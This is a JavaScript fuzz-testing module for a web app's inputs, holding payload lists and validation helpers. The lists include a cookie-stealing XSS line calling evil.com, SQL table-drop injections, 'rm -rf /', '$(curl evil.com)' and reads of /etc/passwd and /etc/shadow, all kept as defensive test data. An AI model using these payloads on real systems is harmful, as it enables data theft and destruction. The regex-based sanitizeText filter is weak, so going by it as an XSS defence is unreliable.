/**
 * Fuzzing and Input Validation Test Suite
 *
 * This file contains comprehensive fuzzing tests to validate:
 * - Input sanitization
 * - XSS prevention
 * - SQL injection prevention
 * - Buffer overflow handling
 * - Type coercion vulnerabilities
 * - Edge case handling
 */

// Test data generators
export const FuzzGenerators = {
  // XSS attack vectors
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '"><img src=x onerror=prompt(1)>',
    '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
    '\';alert(String.fromCharCode(88,83,83))//\';',
  ],

  // SQL injection payloads
  sqlInjectionPayloads: [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--",
    "1' UNION SELECT * FROM users--",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
  ],

  // Command injection
  commandInjectionPayloads: [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`rm -rf /`",
    "$(curl evil.com)",
    "; cat /etc/shadow",
  ],

  // Path traversal
  pathTraversalPayloads: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f",
  ],

  // Buffer overflow / oversized inputs
  oversizedInputs: [
    "A".repeat(10000),
    "A".repeat(100000),
    "A".repeat(1000000),
    Array(10000).fill("test").join(","),
  ],

  // Type confusion
  typeConfusionPayloads: [
    null,
    undefined,
    NaN,
    Infinity,
    -Infinity,
    {},
    [],
    [1, 2, 3],
    { toString: () => "malicious" },
    function() { return "test"; },
  ],

  // Unicode/encoding attacks
  unicodePayloads: [
    "\u0000", // Null byte
    "\uFEFF", // Zero-width no-break space
    "test\u0000.txt",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
  ],

  // Special characters
  specialCharacters: [
    "!@#$%^&*()_+-=[]{}|;':\",./<>?",
    "©®™€£¥",
    "你好世界",
    "مرحبا",
    "🔥💀👻🎉",
  ],

  // Price manipulation
  priceManipulationPayloads: [
    -1,
    -999999,
    0.00001,
    9999999999,
    "1e308", // Max float
    "-1e308",
    "0x1337", // Hex
    "0o777", // Octal
  ],

  // Empty/whitespace variations
  emptyPayloads: [
    "",
    " ",
    "   ",
    "\t",
    "\n",
    "\r\n",
    "\u200B", // Zero-width space
  ],

  // File upload attacks
  maliciousFileNames: [
    "../../etc/passwd",
    "shell.php.jpg",
    "test.php%00.jpg",
    "<script>.jpg",
    "con.jpg", // Windows reserved name
    "test\0.jpg", // Null byte injection
  ],

  // Generate random fuzzing data
  randomString: (length = 100) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()[]{};<>?,./\\"\'';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  },

  randomNumber: () => Math.random() * 1000000 - 500000,

  randomPrice: () => (Math.random() * 10000 - 5000).toFixed(2),
};

// Test runners
export const FuzzTests = {
  // Test item name input
  testItemName: (setItemName, setError) => {
    const results = [];

    console.group("🔍 Testing Item Name Input");

    // XSS tests
    FuzzGenerators.xssPayloads.forEach((payload, i) => {
      try {
        setItemName(payload);
        results.push({ test: `XSS-${i}`, payload, status: 'needs-sanitization' });
        console.warn(`⚠️  XSS payload accepted: ${payload.substring(0, 50)}`);
      } catch (e) {
        results.push({ test: `XSS-${i}`, payload, status: 'rejected', error: e.message });
        console.log(`✅ XSS payload rejected: ${payload.substring(0, 50)}`);
      }
    });

    // Oversized input tests
    FuzzGenerators.oversizedInputs.forEach((payload, i) => {
      try {
        setItemName(payload);
        results.push({ test: `Size-${i}`, size: payload.length, status: 'accepted' });
        console.warn(`⚠️  Oversized input accepted: ${payload.length} chars`);
      } catch (e) {
        results.push({ test: `Size-${i}`, size: payload.length, status: 'rejected' });
        console.log(`✅ Oversized input rejected: ${payload.length} chars`);
      }
    });

    // Type confusion tests
    FuzzGenerators.typeConfusionPayloads.forEach((payload, i) => {
      try {
        setItemName(payload);
        results.push({ test: `Type-${i}`, payload: String(payload), status: 'accepted' });
        console.warn(`⚠️  Type confusion accepted: ${typeof payload}`);
      } catch (e) {
        results.push({ test: `Type-${i}`, payload: typeof payload, status: 'rejected' });
        console.log(`✅ Type confusion rejected: ${typeof payload}`);
      }
    });

    console.groupEnd();
    return results;
  },

  // Test location input
  testLocation: (setLocation) => {
    const results = [];

    console.group("📍 Testing Location Input");

    FuzzGenerators.pathTraversalPayloads.forEach((payload, i) => {
      try {
        setLocation(payload);
        results.push({ test: `PathTraversal-${i}`, payload, status: 'needs-sanitization' });
        console.warn(`⚠️  Path traversal accepted: ${payload}`);
      } catch (e) {
        results.push({ test: `PathTraversal-${i}`, payload, status: 'rejected' });
        console.log(`✅ Path traversal rejected: ${payload}`);
      }
    });

    console.groupEnd();
    return results;
  },

  // Test additional details (potential for injection)
  testAdditionalDetails: (setAdditionalDetails) => {
    const results = [];

    console.group("📝 Testing Additional Details Input");

    [...FuzzGenerators.xssPayloads, ...FuzzGenerators.sqlInjectionPayloads].forEach((payload, i) => {
      try {
        setAdditionalDetails(payload);
        results.push({ test: `Injection-${i}`, payload, status: 'needs-sanitization' });
        console.warn(`⚠️  Injection payload accepted: ${payload.substring(0, 50)}`);
      } catch (e) {
        results.push({ test: `Injection-${i}`, payload, status: 'rejected' });
        console.log(`✅ Injection payload rejected: ${payload.substring(0, 50)}`);
      }
    });

    console.groupEnd();
    return results;
  },

  // Test image upload validation
  testImageUpload: async () => {
    const results = [];

    console.group("🖼️  Testing Image Upload");

    // Test malicious file names
    FuzzGenerators.maliciousFileNames.forEach((fileName, i) => {
      console.log(`Testing file name: ${fileName}`);
      results.push({ test: `FileName-${i}`, fileName, note: 'Manual verification needed' });
    });

    // Test oversized files
    const sizes = [1024 * 1024 * 6, 1024 * 1024 * 10, 1024 * 1024 * 100]; // 6MB, 10MB, 100MB
    sizes.forEach((size, i) => {
      console.log(`Testing file size: ${(size / 1024 / 1024).toFixed(2)}MB`);
      results.push({ test: `FileSize-${i}`, size, note: 'Should reject files > 5MB' });
    });

    console.groupEnd();
    return results;
  },

  // Test price-related inputs
  testPriceInputs: () => {
    const results = [];

    console.group("💰 Testing Price Inputs");

    FuzzGenerators.priceManipulationPayloads.forEach((payload, i) => {
      try {
        const parsed = parseFloat(payload);
        results.push({ test: `Price-${i}`, payload, parsed, status: 'accepted' });
        console.log(`Price payload: ${payload} → ${parsed}`);
      } catch (e) {
        results.push({ test: `Price-${i}`, payload, status: 'error', error: e.message });
      }
    });

    console.groupEnd();
    return results;
  },

  // Rate limiting test
  testRateLimiting: async (analyzePricing) => {
    console.group("⏱️  Testing Rate Limiting");

    const results = [];
    const startTime = Date.now();

    // Attempt 20 rapid requests
    for (let i = 0; i < 20; i++) {
      try {
        await analyzePricing();
        results.push({ attempt: i + 1, status: 'accepted', timestamp: Date.now() - startTime });
      } catch (e) {
        results.push({ attempt: i + 1, status: 'rejected', error: e.message });
      }
    }

    console.log(`Completed ${results.length} requests in ${Date.now() - startTime}ms`);
    console.groupEnd();

    return results;
  },

  // Run all tests
  runAllTests: async (appFunctions) => {
    console.log("🚀 Starting Comprehensive Fuzz Testing Suite");
    console.log("=".repeat(60));

    const allResults = {
      timestamp: new Date().toISOString(),
      tests: {}
    };

    allResults.tests.itemName = FuzzTests.testItemName(
      appFunctions.setItemName,
      appFunctions.setError
    );

    allResults.tests.location = FuzzTests.testLocation(
      appFunctions.setLocation
    );

    allResults.tests.additionalDetails = FuzzTests.testAdditionalDetails(
      appFunctions.setAdditionalDetails
    );

    allResults.tests.imageUpload = await FuzzTests.testImageUpload();

    allResults.tests.priceInputs = FuzzTests.testPriceInputs();

    console.log("=".repeat(60));
    console.log("✅ Fuzz Testing Complete");
    console.log("📊 Results:", allResults);

    return allResults;
  }
};

// Validation utilities for production
export const InputValidation = {
  // Sanitize text input (prevent XSS)
  sanitizeText: (input, maxLength = 500) => {
    if (typeof input !== 'string') return '';

    return input
      .substring(0, maxLength)
      .replace(/[<>]/g, '') // Remove potential HTML tags
      .replace(/javascript:/gi, '') // Remove javascript: protocol
      .replace(/on\w+=/gi, ''); // Remove event handlers
  },

  // Validate price
  validatePrice: (price) => {
    const num = parseFloat(price);
    if (isNaN(num)) return { valid: false, error: 'Invalid price format' };
    if (num < 0) return { valid: false, error: 'Price cannot be negative' };
    if (num > 1000000) return { valid: false, error: 'Price exceeds maximum' };
    return { valid: true, value: num };
  },

  // Validate image file
  validateImageFile: (file) => {
    const validTypes = [
      'image/jpeg',
      'image/jpg',
      'image/png',
      'image/gif',
      'image/webp',
      'image/heic',
      'image/heif',
      'image/heic-sequence',
      'image/heif-sequence'
    ];
    const maxSize = 5 * 1024 * 1024; // 5MB

    if (!validTypes.includes(file.type.toLowerCase())) {
      return { valid: false, error: 'Invalid file type. Use JPEG, PNG, GIF, WebP, or HEIC' };
    }

    if (file.size > maxSize) {
      return { valid: false, error: 'File too large. Maximum size is 5MB' };
    }

    // Check file name for path traversal
    if (file.name.includes('..') || file.name.includes('/') || file.name.includes('\\')) {
      return { valid: false, error: 'Invalid file name' };
    }

    return { valid: true };
  },

  // Rate limiting helper
  createRateLimiter: (maxRequests = 10, windowMs = 60000) => {
    const requests = [];

    return () => {
      const now = Date.now();
      const windowStart = now - windowMs;

      // Remove old requests
      const recentRequests = requests.filter(time => time > windowStart);

      if (recentRequests.length >= maxRequests) {
        return {
          allowed: false,
          error: `Rate limit exceeded. Maximum ${maxRequests} requests per ${windowMs/1000} seconds`
        };
      }

      requests.push(now);
      return { allowed: true };
    };
  }
};

export default { FuzzGenerators, FuzzTests, InputValidation };
